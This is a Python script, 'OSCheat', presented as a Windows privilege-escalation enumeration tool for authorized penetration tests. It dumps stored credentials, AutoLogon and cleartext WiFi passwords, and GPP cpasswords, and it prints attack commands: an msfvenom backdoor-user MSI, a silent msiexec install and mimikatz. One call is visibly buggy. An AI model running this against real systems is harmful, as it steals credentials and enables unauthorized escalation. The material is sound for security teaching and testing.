#!/usr/bin/env python3
"""
OSCheat - Comprehensive Windows enumeration for authorized penetration testing
Pure Python version - works on any Windows box with Python 3.x installed
No PowerShell dependency required.

Usage:
    python oscheat.py
    python oscheat.py --quiet
    python oscheat.py --output C:\\Windows\\Temp\\reports

Author: Sunz + Flint (Flint Flich 🔥)
"""

import sys
import os
import platform
import subprocess
import socket
import getpass
import datetime
import argparse
import re
import json
import shutil
from pathlib import Path

# ANSI color codes for Windows 10+ (requires ANSI enabled)
if sys.platform == "win32":
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass  # Older Windows, no color

class C:
    """ANSI color codes"""
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"

def banner(text="", color=C.CYAN):
    bar = "=" * 78
    print(f"\n{color}{bar}")
    print(f"{color}= " + text.center(74) + " =")
    print(f"{color}{bar}\033[0m\n")

def section(title):
    print(f"\n{C.MAGENTA}{'=' * 78}")
    print(f"  {title}")
    print(f"{'=' * 78}{C.RESET}")

def finding(msg):
    print(f"  {C.RED}[!] {msg}{C.RESET}")

def suggestion(msg):
    print(f"  {C.YELLOW}[?] {msg}{C.RESET}")

def info(msg, quiet=False):
    if not quiet:
        print(f"  {C.GRAY}[i] {msg}{C.RESET}")

def ok(msg, quiet=False):
    if not quiet:
        print(f"  {C.GREEN}[+] {msg}{C.RESET}")

def run(cmd, timeout=30, shell=False):
    """Run a subprocess and return (returncode, stdout, stderr)"""
    try:
        r = subprocess.run(
            cmd if shell else cmd.split(),
            capture_output=True, text=True,
            timeout=timeout, shell=shell
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"Timeout ({timeout}s)"
    except FileNotFoundError as e:
        return 1, "", str(e)
    except Exception as e:
        return 1, "", str(e)

def is_admin():
    """Check if running with admin privileges"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def save_file(content, path):
    """Save content to file, ensuring parent dir exists"""
    try:
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        Path(path).write_text(content, encoding='utf-8', errors='ignore')
    except Exception as e:
        print(f"  {C.RED}Failed to save {path}: {e}{C.RESET}")

#==============================================================================
# 1. SYSTEM INFO
#==============================================================================
def section_01_system_info(args):
    section("01. SYSTEM INFO")
    try:
        rc, out, err = run("systeminfo", timeout=15, shell=True)
        print(out[:3000] if out else "  Could not get systeminfo")
        save_file(out or err, f"{args.output}/systeminfo.txt")
    except Exception as e:
        finding(f"Could not get system info: {e}")

    # Quick fact summary
    print()
    print(f"  Hostname:        {socket.gethostname()}")
    print(f"  Username:        {getpass.getuser()}")
    print(f"  OS:              {platform.system()} {platform.release()} ({platform.version()})")
    print(f"  Architecture:    {platform.machine()}")
    print(f"  Admin:           {is_admin()}")
    print(f"  Python:          {platform.python_version()}")

#==============================================================================
# 2. USERS & GROUPS
#==============================================================================
def section_02_users(args):
    section("02. USERS & GROUPS")
    
    # whoami /all
    print(f"  {C.WHITE}whoami /all:{C.RESET}")
    rc, out, err = run("whoami", shell=False)
    print(f"    Current user: {out.strip()}")
    
    rc, out, err = run("whoami", args, shell=True)
    # Better: use /priv /groups
    rc, out, _ = run('whoami /all', shell=True)
    print(f"\n{out}" if out else "  (no whoami /all output)")
    
    # Highlight dangerous privileges
    DANGEROUS = [
        ("SeImpersonatePrivilege", "SeImpersonate - Potato attacks (Rogue/Juicy/PrintSpoofer)"),
        ("SeBackupPrivilege", "SeBackup - can read SAM/SYSTEM hives"),
        ("SeRestorePrivilege", "SeRestore - can write to protected paths"),
        ("SeTakeOwnershipPrivilege", "SeTakeOwnership - take ownership of any object"),
        ("SeDebugPrivilege", "SeDebug - inject into any process"),
        ("SeLoadDriverPrivilege", "SeLoadDriver - load arbitrary kernel drivers"),
    ]
    
    if out:
        for priv, hint in DANGEROUS:
            if priv in out and "Enabled" in out.split(priv)[1][:50] if priv in out else False:
                finding(hint)
    
    save_file(out or "", f"{args.output}/whoami.txt")
    
    # net users
    print()
    rc, out, _ = run("net user", shell=True)
    if out:
        print(f"  {C.WHITE}Local users:{C.RESET}")
        for line in out.split("\n"):
            if line.strip() and not line.startswith("The command"):
                print(f"    {line.strip()}")
        save_file(out, f"{args.output}/net_user.txt")
    
    # net localgroup Administrators
    print()
    rc, out, _ = run("net localgroup Administrators", shell=True)
    if out:
        print(f"  {C.WHITE}Administrators group:{C.RESET}")
        for line in out.split("\n"):
            if line.strip() and not line.startswith("The command"):
                print(f"    {line.strip()}")

#==============================================================================
# 3. NETWORK INFO
#==============================================================================
def section_03_network(args):
    section("03. NETWORK INFO")
    
    rc, out, _ = run("ipconfig /all", shell=True)
    if out:
        print(out[:2000])
        save_file(out, f"{args.output}/ipconfig.txt")
    
    # netstat -ano listening
    print()
    rc, out, _ = run("netstat -ano", shell=True)
    if out:
        listening = [l for l in out.split("\n") if "LISTENING" in l]
        print(f"  {C.WHITE}Listening ports ({len(listening)}):{C.RESET}")
        for line in listening[:20]:
            print(f"    {line.strip()}")
        save_file(out, f"{args.output}/netstat.txt")
    
    # arp
    rc, out, _ = run("arp -a", shell=True)
    if out:
        save_file(out, f"{args.output}/arp.txt")
    
    # route
    rc, out, _ = run("route print", shell=True)
    if out:
        save_file(out, f"{args.output}/route.txt")

#==============================================================================
# 4. PROCESSES & SERVICES
#==============================================================================
def section_04_services(args):
    section("04. PROCESSES & SERVICES")
    
    # tasklist /v
    rc, out, _ = run("tasklist /v", shell=True, timeout=15)
    if out:
        print(f"  {C.WHITE}Running processes:{C.RESET}")
        for line in out.split("\n")[3:35]:  # skip header
            if line.strip():
                print(f"    {line.strip()[:120]}")
        save_file(out, f"{args.output}/tasklist.txt")
    
    # sc query - all services
    print()
    rc, out, _ = run("sc query", shell=True, timeout=15)
    if out:
        save_file(out, f"{args.output}/services.txt")
    
    # Check for unquoted service paths via wmic
    print()
    print(f"  {C.WHITE}Unquoted Service Paths (potential hijack):{C.RESET}")
    rc, out, _ = run('wmic service get name,pathname,startname', shell=True, timeout=15)
    unquoted_count = 0
    if out:
        for line in out.split("\n"):
            line = line.strip()
            # Skip empty and header
            if not line or "PathName" in line:
                continue
            # Check for unquoted path with space
            path_match = re.search(r'(?:^|\s)((?:[A-Za-z]:)?\\[^\s"]+\.exe)', line)
            if path_match:
                path = path_match.group(1)
                if " " in path and not path.startswith('"'):
                    unquoted_count += 1
                    if unquoted_count <= 10:  # Show first 10
                        finding(f"Unquoted: {line[:200]}")
        if unquoted_count == 0:
            ok("No obvious unquoted service paths found")
        else:
            print(f"    Total unquoted services found: {unquoted_count}")

#==============================================================================
# 5. INSTALLED SOFTWARE
#==============================================================================
def section_05_software(args):
    section("05. INSTALLED SOFTWARE")
    
    # Use registry to list installed software
    print(f"  {C.WHITE}Installed applications (from registry):{C.RESET}")
    interesting_patterns = re.compile(
        r'putty|winscp|filezilla|vmware|virtualbox|vnc|tightvnc|'
        r'kaspersky|symantec|mcafee|avg|avast|norton|webroot|'
        r'office|outlook|thunderbird|sql|mysql|postgres|'
        r'chrome|firefox|7-zip|notepad\+\+|sublime|'
        r'nmap|wireshark|metasploit|burp|sqlmap',
        re.IGNORECASE
    )
    
    if sys.platform == "win32":
        try:
            import winreg
            paths = [
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            ]
            apps = []
            for hkey, path in paths:
                try:
                    with winreg.OpenKey(hkey, path) as key:
                        i = 0
                        while True:
                            try:
                                subkey_name = winreg.EnumKey(key, i)
                                with winreg.OpenKey(key, subkey_name) as subkey:
                                    try:
                                        name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                                        ver, _ = winreg.QueryValueEx(subkey, "DisplayVersion")
                                        apps.append((name, ver))
                                    except FileNotFoundError:
                                        pass
                                i += 1
                            except OSError:
                                break
                except Exception:
                    pass
            
            for name, ver in sorted(set(apps)):
                color = C.YELLOW if interesting_patterns.search(name) else C.WHITE
                print(f"    {color}{name[:50]:<50} v{ver}{C.RESET}")
            
            save_file("\n".join(f"{n}\t{v}" for n, v in apps), f"{args.output}/software.txt")
        except ImportError:
            info("winreg not available")
    else:
        info("Not Windows - skipping registry enumeration")

#==============================================================================
# 6. SCHEDULED TASKS
#==============================================================================
def section_06_tasks(args):
    section("06. SCHEDULED TASKS")
    
    if sys.platform == "win32":
        rc, out, _ = run("schtasks /query /fo LIST /v", shell=True, timeout=20)
        if out:
            # Look for tasks with RUN AS user != SYSTEM
            lines = out.split("\n")
            privileged_count = 0
            print(f"  {C.WHITE}Scheduled tasks (highlighting privileged runs):{C.RESET}")
            for i, line in enumerate(lines):
                if "Run As User:" in line and "SYSTEM" not in line and "Local Service" not in line and "Network Service" not in line and line.split(":")[1].strip():
                    name_line = lines[max(0, i-8):i+1]
                    task_name = next((l.split(":")[1].strip() for l in name_line if "HostName:" in l), "?")
                    finding(f"Non-system task: {task_name}")
                    privileged_count += 1
            if privileged_count == 0:
                ok("All tasks run as SYSTEM/LocalService/NetworkService")
            save_file(out, f"{args.output}/schtasks.txt")
    else:
        info("Not Windows")

#==============================================================================
# 7. AUTOSTART
#==============================================================================
def section_07_autostart(args):
    section("07. AUTOSTART LOCATIONS")
    
    keys = [
        (r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "HKCU Run"),
        (r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU RunOnce"),
        (r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "HKLM Run"),
        (r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "HKLM Run (WOW64)"),
    ]
    
    if sys.platform == "win32":
        try:
            import winreg
            for full_key, label in keys:
                root, sub = full_key.split("\\", 1)
                hkey = winreg.HKEY_CURRENT_USER if root == "HKCU" else winreg.HKEY_LOCAL_MACHINE
                print(f"  {C.WHITE}{label}:{C.RESET}")
                try:
                    with winreg.OpenKey(hkey, sub) as key:
                        i = 0
                        while True:
                            try:
                                name, value, _ = winreg.EnumValue(key, i)
                                print(f"    {name} = {value[:100]}")
                                i += 1
                            except OSError:
                                break
                except FileNotFoundError:
                    print(f"    (not set)")
                except Exception as e:
                    print(f"    {C.YELLOW}(access denied or empty){C.RESET}")
                print()
        except ImportError:
            info("winreg not available")

#==============================================================================
# 8. CREDENTIALS
#==============================================================================
def section_08_credentials(args):
    section("08. CREDENTIALS & SECRETS")
    
    # cmdkey /list
    print(f"  {C.WHITE}Stored Credentials (cmdkey /list):{C.RESET}")
    rc, out, _ = run("cmdkey /list", shell=True)
    if out:
        for line in out.split("\n"):
            if line.strip() and "Target" in line:
                print(f"    {line.strip()}")
        save_file(out, f"{args.output}/cmdkey.txt")
    
    # AutoLogon
    print()
    print(f"  {C.WHITE}AutoLogon in Registry:{C.RESET}")
    if sys.platform == "win32":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon") as key:
                try:
                    user, _ = winreg.QueryValueEx(key, "DefaultUserName")
                    finding(f"AutoLogon user: {user}")
                except FileNotFoundError:
                    info("No AutoLogon user set")
                try:
                    pwd, _ = winreg.QueryValueEx(key, "DefaultPassword")
                    finding(f"AutoLogon PASSWORD IN REGISTRY: {pwd}")
                except FileNotFoundError:
                    info("No AutoLogon password (good)")
        except Exception as e:
            info(f"Cannot read Winlogon: {e}")
    
    # WiFi passwords
    print()
    print(f"  {C.WHITE}WiFi Profiles:{C.RESET}")
    rc, out, _ = run('netsh wlan show profiles', shell=True)
    if out and "doesn't exist" not in out.lower():
        profiles = []
        for line in out.split("\n"):
            if "All User Profile" in line or "Profile" in line:
                m = re.search(r":\s*(.+)$", line)
                if m:
                    profiles.append(m.group(1).strip())
        
        for p in profiles:
            rc2, out2, _ = run(f'netsh wlan show profile "{p}" key=clear', shell=True)
            if out2:
                m = re.search(r"Key Content\s*:\s*(.+)$", out2, re.MULTILINE)
                if m and m.group(1).strip():
                    finding(f"WiFi '{p}' password: {m.group(1).strip()}")
    
    # GPP cpassword (decryptable historical weakness)
    print()
    print(f"  {C.WHITE}Group Policy Preferences:{C.RESET}")
    gpp_paths = [
        r"C:\ProgramData\Microsoft\Group Policy\History",
        r"C:\Windows\SYSVOL\domain\Policies",
    ]
    for gp in gpp_paths:
        if Path(gp).exists():
            for f in Path(gp).rglob("Groups.xml"):
                try:
                    content = f.read_text(encoding='utf-16', errors='ignore')
                    matches = re.findall(r'cpassword="([^"]+)"', content)
                    if matches:
                        finding(f"cpassword found in {f}: {matches[0]}")
                        info("Decrypt with: gpp-decrypt <cpassword> (or use gMSADumper for AES key)")
                except Exception:
                    pass

#==============================================================================
# 9. UAC / AlwaysInstallElevated / Security Policy
#==============================================================================
def section_09_security(args):
    section("09. SECURITY POLICY & UAC")
    
    # AlwaysInstallElevated
    print(f"  {C.WHITE}AlwaysInstallElevated (the holy grail check):{C.RESET}")
    if sys.platform == "win32":
        try:
            import winreg
            hklm_val = None
            hkcu_val = None
            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                    r"SOFTWARE\Policies\Microsoft\Windows\Installer") as k:
                    hklm_val, _ = winreg.QueryValueEx(k, "AlwaysInstallElevated")
            except FileNotFoundError:
                pass
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                    r"SOFTWARE\Policies\Microsoft\Windows\Installer") as k:
                    hkcu_val, _ = winreg.QueryValueEx(k, "AlwaysInstallElevated")
            except FileNotFoundError:
                pass
            
            print(f"    HKLM: {hklm_val}")
            print(f"    HKCU: {hkcu_val}")
            
            if hklm_val == 1 and hkcu_val == 1:
                finding("AlwaysInstallElevated = 1 on BOTH hives!")
                finding("Generate MSI: msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi")
                finding("Run: msiexec /quiet /qn /i evil.msi")
            else:
                ok("AlwaysInstallElevated not set on both keys")
        except ImportError:
            pass
    
    # WDigest
    print()
    print(f"  {C.WHITE}WDigest cache:{C.RESET}")
    if sys.platform == "win32":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest") as k:
                digest, _ = winreg.QueryValueEx(k, "UseLogonCredential")
                if digest == 1:
                    finding("WDigest caching cleartext creds! Use mimikatz sekurlsa::wdigest")
                else:
                    info(f"WDigest UseLogonCredential = {digest}")
        except FileNotFoundError:
            info("WDigest setting not found (likely disabled)")
        except Exception as e:
            info(f"Cannot read WDigest: {e}")
    
    # WinRM
    print()
    rc, out, _ = run('sc query WinRM', shell=True)
    if out:
        print(f"  {C.WHITE}WinRM Service:{C.RESET}")
        print(f"    {out.strip()[:200]}")
    
    # UAC level
    print()
    print(f"  {C.WHITE}UAC Level:{C.RESET}")
    if sys.platform == "win32":
        try:
            import winreg
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System") as k:
                consent, _ = winreg.QueryValueEx(k, "ConsentPromptBehaviorAdmin")
                lua, _ = winreg.QueryValueEx(k, "EnableLUA")
                print(f"    ConsentPromptBehaviorAdmin: {consent}")
                print(f"    EnableLUA: {lua}")
                if consent == 0:
                    finding("UAC is effectively DISABLED - all bypass methods work")
        except Exception as e:
            info(f"Cannot read UAC: {e}")

#==============================================================================
# 10. FILESYSTEM
#==============================================================================
def section_10_files(args):
    section("10. FILESYSTEM CHECKS")
    
    # Search for password files
    print(f"  {C.WHITE}Heuristic search for password files...{C.RESET}")
    patterns = ["password*", "*passwd*", "*.kdbx", "*.pem",
                "unattend.xml", "*.bak", "*.sql", "*.db",
                "*.config", "*.ini", "*.kdb", "*.key"]
    
    user_dirs = [Path("C:/Users")]
    for user_dir in user_dirs:
        if not user_dir.exists():
            continue
        for pat in patterns:
            count = 0
            for f in user_dir.rglob(pat):
                count += 1
                if count <= 5 and "AppData" not in str(f):
                    # Only show small/interesting files
                    if f.stat().st_size < 1_000_000:
                        info(f"Found: {f}")
    
    # Documents, Desktop
    if sys.platform == "win32":
        userprofile = os.environ.get("USERPROFILE", "")
        for subdir in ["Documents", "Desktop", "Downloads"]:
            d = Path(userprofile) / subdir
            if d.exists():
                for f in d.rglob("*"):
                    if f.is_file() and f.suffix.lower() in [".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".config", ".ini", ".bat", ".ps1", ".cmd"]:
                        if f.stat().st_size < 5_000_000:  # 5MB max
                            info(f"Review: {f}")

#==============================================================================
# MAIN
#==============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="OSCheat - Windows enumeration for authorized pentesting",
        epilog="Only use on systems you own or have explicit written authorization to test."
    )
    parser.add_argument("--quiet", "-q", action="store_true",
                        help="Suppress [i] info, only show [+] findings and warnings")
    parser.add_argument("--output", "-o",
                        default=f"{os.environ.get('TEMP', '/tmp')}/oscheat_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}",
                        help="Directory for full reports")
    parser.add_argument("--no-save", action="store_true",
                        help="Don't save individual report files")
    
    args = parser.parse_args()
    
    # Banner
    print(f"\n{C.CYAN}  {'=' * 70}")
    print(f"  {'  OSCheat v1.0 - Pure Python Edition'.center(70)}")
    print(f"  {'  Windows enumeration for authorized pentest'.center(70)}")
    print(f"  {'=' * 70}\033[0m\n")
    
    print(f"  Started: {datetime.datetime.now().isoformat()}")
    print(f"  Output:  {args.output}")
    print(f"  Quiet:   {args.quiet}")
    
    if not args.no_save:
        Path(args.output).mkdir(parents=True, exist_ok=True)
    
    # Run sections
    section_01_system_info(args)
    section_02_users(args)
    section_03_network(args)
    section_04_services(args)
    section_05_software(args)
    section_06_tasks(args)
    section_07_autostart(args)
    section_08_credentials(args)
    section_09_security(args)
    section_10_files(args)
    
    # Summary
    banner("SUMMARY", C.GREEN)
    print("  Top escalation vectors to investigate:")
    print()
    print("    1. AlwaysInstallElevated -> free MSI elevation")
    print("    2. SeImpersonate / SeBackup / SeRestore / SeDebug -> Potato attacks")
    print("    3. Unquoted service paths -> service hijack")
    print("    4. cmdkey stored credentials -> direct reuse")
    print("    5. WDigest caching -> Mimikatz from your workstation")
    print("    6. cpassword in GPP -> free Win admin")
    print("    7. WiFi / autoLogon creds -> lateral movement")
    print("    8. World-writable service dirs -> DLL hijack")
    print()
    print(f"  Reports saved to: {args.output}")
    if Path(args.output).exists():
        for f in sorted(Path(args.output).iterdir()):
            size_kb = f.stat().st_size / 1024
            print(f"    {f.name:<30} {size_kb:.1f} KB")
    
    print(f"\n{C.GREEN}  Finished at {datetime.datetime.now().isoformat()}\033[0m\n")

if __name__ == "__main__":
    main()
